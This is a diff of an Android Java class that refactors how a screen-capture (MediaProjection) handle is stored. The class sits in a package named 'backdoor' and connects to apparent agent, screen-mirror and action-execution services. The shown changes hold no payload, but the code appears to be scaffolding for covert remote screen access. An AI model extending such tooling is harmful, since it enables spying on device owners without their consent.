@@ -1,5 +1,5 @@
-// ServiceController.java
 package com.lazyframework.backdoor;
+
 
 import android.media.projection.MediaProjection;
 import android.util.Log;
@@ -18,7 +18,6 @@ public class ServiceController {
             new AtomicReference<>(null);
     private static final AtomicReference<ScreenStreamHelper> streamHelperRef =
             new AtomicReference<>(null);
-    private static MediaProjection sMediaProjection = null;
 
     // ==================== SET REFERENCES ====================
 
@@ -63,15 +62,6 @@ public class ServiceController {
         }
     }
 
-    public static void setMediaProjection(MediaProjection projection) {
-        sMediaProjection = projection;
-        Log.d(TAG, "✅ MediaProjection set: " + (projection != null ? "NOT NULL" : "NULL"));
-    }
-
-    public static MediaProjection getMediaProjection() {
-        return sMediaProjection;
-    }
-
     // ==================== GET REFERENCES ====================
 
     public static AgentService getAgentService() {
@@ -107,8 +97,19 @@ public class ServiceController {
     }
 
     // ==================== STATUS ====================
+    // ServiceController.java - Tambahkan di bagian GET REFERENCES
 
+public static MediaProjection getMediaProjection() {
+    ScreenMirrorService service = mirrorServiceRef.get();
+    if (service != null) {
+        return ScreenMirrorService.getMediaProjection();
+    }
+    return null;
+}
 
+public static void setMediaProjection(MediaProjection projection) {
+    ScreenMirrorService.setMediaProjection(projection);
+}
 
     public static String getDebugInfo() {
         StringBuilder sb = new StringBuilder();
@@ -189,8 +190,6 @@ public class ServiceController {
     public static boolean isStreamHelperAvailable() {
         return streamHelperRef.get() != null;
     }
-    
-
 
     // ==================== EXECUTE ACTIONS ====================
 
